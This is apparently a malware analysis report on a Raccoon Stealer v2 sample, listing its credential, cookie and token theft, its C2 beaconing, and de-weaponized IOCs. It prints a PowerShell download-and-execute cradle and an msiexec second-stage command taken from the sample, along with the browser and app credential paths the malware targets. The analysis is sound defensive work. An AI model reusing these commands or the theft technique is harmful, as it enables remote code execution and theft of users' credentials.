---
title: "Malware Analysis: Raccoon Stealer v2 (PE · exe · 3bb5bf52)"
published: 2026-11-02
draft: false
description: "Malicious (medium confidence): Raccoon Stealer v2 · stealer/loader · difficulty medium · dynamic sandbox + static decompilation"
tags: ["Raccoon", "stealer", "loader", "PE"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-02-Raccoon-Stealer-v2-3bb5bf52"
---

> [!WARNING]
> **Verdict: malicious** · Family **Raccoon Stealer v2** (doubtful) · Confidence **medium**
> 
> Aliases: Raccoon, RecordBreaker, Raccoon v2
> 
> The sample embeds a complete theft configuration obfuscated with RC4+Base64, and in a real dynamic environment it was observed sending an encrypted registration beacon to its C2; static and dynamic evidence consistently point to credential/session/token theft and second-stage download capability.

## At a glance

| Item | Content |
|:--|:--|
| Family | **Raccoon Stealer v2** · Aliases Raccoon, RecordBreaker, Raccoon v2 · _doubtful_ |
| Confidence | **Medium** |
| Behavior classes | stealer · loader |
| Difficulty | medium |
| First seen | 2026-11-01 11:32:37 |
| Analysis method | Dynamic sandbox analysis + static decompilation |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/3bb5bf520eb23961d31d5af97d67bea6fff6e111c96eac490044c5b9720a04af/) |

## Attack chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Decrypt built-in config</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="84" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="84" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Register C2, report HWID</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<rect x="586" y="73" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="88" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">Dynamic</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Steal browser credentials</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1555.003</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Decrypt Chrome v20 key</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1555.003</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Steal cookie sessions</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1539</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
</svg>

## Sample identification

| Item | Value |
|:--|:--|
| SHA-256 | `3bb5bf520eb23961d31d5af97d67bea6fff6e111c96eac490044c5b9720a04af` |
| MD5 | _not recorded_ |
| Size | 634,880 bytes (620.0 KB) |
| Type | PE · `exe` |

## Behavior analysis

**11** behaviors in total, each backed by evidence; **10** are obtainable statically and **1** was obtained through dynamic analysis.

### 1. Decrypt built-in configuration

`T1027` · Confidence **High** · Static

Early in startup it initializes an RC4 table with a fixed key and RC4-decrypts the Base64 strings in .rdata one by one, recovering 421 entries: C2, paths, field names, and API names.

> **Evidence**: 0x270c writes the RC4 key; 0x2be88 Base64 decode; 0x2bb04 RC4; decrypted results include the C2 and all theft modules
> 
> **Source**: `ev-000020` · `ev-000022` · `ev-000023` · `ev-000024` · `ev-000025`

### 2. Register with C2 and report HWID

`T1071.001` · Confidence **High** · Dynamic

After running it sends an RC4-encrypted registration JSON to 162.35.243[.]151:80, containing build=new6, the victim HWID, and type=create.

> **Evidence**: dynamic network: process 2196 POSTs to hxxp://162.35.243[.]151:80 after startup; payload decrypts to {build:new6, hwid:3F26AF00-0FAF-A434-EBC8-47BCC3105FC4, type:create}
> 
> **Source**: `ev-000024` · `ev-000025` · `ref:1039bc62d7`

### 3. Steal browser credentials

`T1555.003` · Confidence **High** · Static

Locates Local State and Login Data for Chrome/Brave/Edge, reads the encrypted credentials, and decrypts usernames and passwords via CryptUnprotectData/BCrypt.

> **Evidence**: decrypted strings: \Google\Chrome\User Data\Local State, \BraveSoftware\Brave-Browser\User Data\Local State, \Microsoft\Edge\User Data\Local State; app_bound_encrypted_key at .data 0x8d280; imports CryptUnprotectData/BCryptDecrypt
> 
> **Source**: `ev-000025` · `ref:952aed24eb`

### 4. Decrypt Chrome v20 keys

`T1555.003` · Confidence **High** · Static

Parses app_bound_encrypted_key (APPB prefix) from Local State and uses BCrypt AES-GCM to recover the browser master key for decrypting new-version cookies.

> **Evidence**: decrypted strings: app_bound_encrypted_key, APPB, use_v20; API strings: BCryptGenerateSymmetricKey, BCryptDecrypt, ChainingModeGCM
> 
> **Source**: `ev-000025`

### 5. Steal cookie sessions

`T1539` · Confidence **High** · Static

Reads host_key/encrypted_value/expires_utc from cookies.sqlite and parses logins, autofill, credit cards, and history from Login Data, Web Data, and History.

> **Evidence**: decrypted strings: cookies.sqlite, encrypted_value, host_key, expires_utc, Login Data, Web Data, credit_cards, autofill, History
> 
> **Source**: `ev-000025`

### 6. Steal Discord tokens

`T1528` · Confidence **High** · Static

Traverses Discord's Local Storage/leveldb and IndexedDB, extracting local and synced tokens and writing them to tokens.txt.

> **Evidence**: decrypted strings: \discord\Local Storage\leveldb, from_local, from_sync, from_IndexedDB, soft\Discord\tokens.txt
> 
> **Source**: `ev-000025`

### 7. Steal Steam tokens

`T1528` · Confidence **High** · Static

Reads the Steam install path, ssfn*, config.vdf, loginusers.vdf, and ConnectCache, exporting the SteamID and tokens.

> **Evidence**: decrypted strings: Software\Valve\Steam, SteamPath, ssfn*, config.vdf, loginusers.vdf, ConnectCache, soft\Steam\tokens\steam_tokens.txt
> 
> **Source**: `ev-000025`

### 8. Steal email and FTP credentials

`T1555` · Confidence **High** · Static

Parses Outlook Profiles registry keys across versions, Foxmail Account.rec0, and WinSCP Sessions registry keys, exporting email and FTP host/account/password data.

> **Evidence**: decrypted strings: Windows Messaging Subsystem\Profiles, Office\13.0-16.0\Outlook\Profiles, \Accounts\Account.rec0, WinSCP 2\Sessions, soft\Outlook\outlook.txt, soft\WinSCP\winscp.txt
> 
> **Source**: `ev-000025`

### 9. Screenshot and collect host info

`T1113, T1082` · Confidence **High** · Static

Captures the desktop as screenshot.jpg via GDI+ and summarizes username, computer name, OS, CPU/GPU, memory, displays, process list, and installed software.

> **Evidence**: decrypted strings: BitBlt, GdipSaveImageToStream, screenshot.jpg, System Summary, Process List, Installed Apps, Display Resolution; gdiplus/gdi32 loaded in dynamic memory
> 
> **Source**: `ev-000025` · `ref:1039bc62d7`

### 10. Upload stolen data in fragments

`T1041` · Confidence **Medium** · Static

Packages the stolen results and POSTs them to the C2 in fragments as application/json with opcode/data/upload_file fields and part_index/total_parts.

> **Evidence**: decrypted strings: Content-Type: application/json, opcode, data, filename, upload_file, part_index, total_parts, waiting/missing/failed; the same-origin POST registration request was dynamically observed
> 
> **Source**: `ev-000025` · `ref:1039bc62d7`

### 11. Download and execute second-stage payload

`T1105, T1059.001` · Confidence **Medium** · Static

Has a built-in loader configuration and can download and execute a remote EXE/MSI via PowerShell DownloadString+iex or msiexec /passive.

> **Evidence**: decrypted strings: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe, -nop -c, iex(New-Object Net.WebClient).DownloadString(', C:\Windows\system32\msiexec.exe, /passive, loader/set_load/loader_id
> 
> **Source**: `ev-000025`


## IOC (de-weaponized)

### Network

:::note
**Connection dynamically observed**: the sample actually initiated TCP connections to this target (retrying several times within a short period).
:::

:::caution
**Real server side still unverified**: the connections/handshakes above were completed against a local controlled emulation service; the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://162[.]35[.]243[.]151` | 80 | c2 | Dynamic | Observed |

### Host

**Drop paths**

- `%PROGRAMDATA%\soft\Discord\tokens.txt`
- `%PROGRAMDATA%\soft\Steam\tokens\steam_tokens.txt`
- `%PROGRAMDATA%\soft\Outlook\outlook.txt`
- `%PROGRAMDATA%\soft\WinSCP\winscp.txt`
- `%PROGRAMDATA%\soft\FoxMail\`
- `%PROGRAMDATA%\screenshot.jpg`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `hxxp://162[.]35[.]243[.]151` | Yes | Dynamic |
| `c2_port` | `80` | Yes | Dynamic |
| `campaign_id` | `new6` | Yes | Dynamic |
| `victim_hwid` | `3F26AF00-0FAF-A434-EBC8-47BCC3105FC4` | Yes | Dynamic |
| `encryption_algo` | `RC4 + Base64 (config strings and C2 JSON); Chrome v20 uses BCrypt AES-GCM` | Yes | Static |
| `rc4_config_key` | `amsoWeYCyfFL5DurLo` | Yes | Static |
| `rc4_c2_key` | `ZH29EQfFE9gbsuqFZ2` | Yes | Dynamic |
| `output_dir` | `C:\ProgramData\` | Yes | Static |
| `upload_protocol` | `HTTP POST application/json; fields opcode/data/upload_file/part_index/total_parts` | Yes | Static |
| `theft_modules` | `browsers,cookies,logins,history,webdata,discord,steam,outlook,foxmail,winscp,screenshot,system_info,process_list,installed_apps` | Yes | Static |
| `stage2_download` | `powershell -nop -c iex(New-Object Net.WebClient).DownloadString(...); msiexec /passive` | No | Static |

## Do not misjudge

:::important
The following conclusions are **easy to misjudge**; keep this in mind when citing this report.

- The presence of BCrypt/AES-GCM and CryptUnprotectData does not make it ransomware; these APIs decrypt the Chrome v20 app-bound key and browser credentials, and no file encryption or ransom note was observed.
- No service, scheduled-task, or Run-key writes were observed, so persistence capability cannot be claimed; the configuration includes a self_delete option, suggesting self-cleanup after theft.
- Although API names such as WriteProcessMemory/VirtualAllocEx/QueueUserAPC were parsed, no actual call chain was obtained, so process injection cannot be asserted.
- The family attribution is a candidate (Raccoon/RecordBreaker features) without same-source signature confirmation and should not be treated as settled.
- The second-stage sample was not captured, so its concrete payload or subsequent behavior cannot be described.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Dynamic sandbox analysis + static decompilation |
| Unpacking | No |

**Limitations and open questions**

1. The dynamic environment captured only the registration beacon and one C2 POST, not the full log upload or second-stage download; the host had no real browser data, so the theft volume may be incomplete.
2. The output paths and file combinations come from statically decrypted strings and were not confirmed one by one dynamically; they are marked pending dynamic verification.
3. Family attribution is based on similarity of protocol, directory layout, and module combination without same-source YARA/panel fingerprints, and remains a candidate.
4. No persistence, process injection, or successful privilege escalation was observed, so these are not listed as confirmed behaviors.
5. The sample exited after running, and some process records show it had disappeared, so the complete exfiltrated data cannot be quantified.

## Evidence index

<details>
<summary>Expand 12 tool evidence entries</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ev-000001` | Hash and fingerprint | sha256=3bb5bf52...a04af, file size 634880 |
| `ev-000002` | scan.imphash | imphash=a1fa2d08960884e06f2dc59bd5f7a43c |
| `ev-000010` | String extraction | ASCII/UTF-16 strings and browser paths/app_bound_encrypted_key in .data |
| `ev-000020` | decompile.function | FUN_140009ba4: Base64+RC4 decryption entry |
| `ev-000022` | decompile.function | FUN_14002be88: standard Base64 decoding |
| `ev-000023` | decompile.function | FUN_14002bb04: RC4 implementation |
| `ev-000024` | decompile.function | FUN_14000270c: writes the RC4 key and batch-decrypts config strings |
| `ev-000025` | evidence.record | Scripts decrypted 421 strings and recovered the C2 registration JSON (self-reported evidence, confidence capped at 0.7) |
| `ref:952aed24eb` | Import table parsing | 91 KERNEL32 imports, including LoadLibraryA/GetProcAddress/VirtualProtect, etc. |
| `ref:1039bc62d7` | Dynamic analysis platform | Real dynamic: process 2196 POSTs to 162.35.243[.]151:80, capturing the RC4 registration JSON; the process then exits |
| `ref:690ec78685` | scan.entropy | Overall entropy 6.194, all sections below 7, no packing signs |
| `c2_evidence:3bb5bf52` | Connection evidence extraction | Dynamic network monitoring recorded 2 connection attempts to 162.35.243[.]151:80, 162[.]35[.]243[.]151:80; no complete session captured |

</details>

---

_This report's sample is not public; IOCs have been de-weaponized and are for security research only._
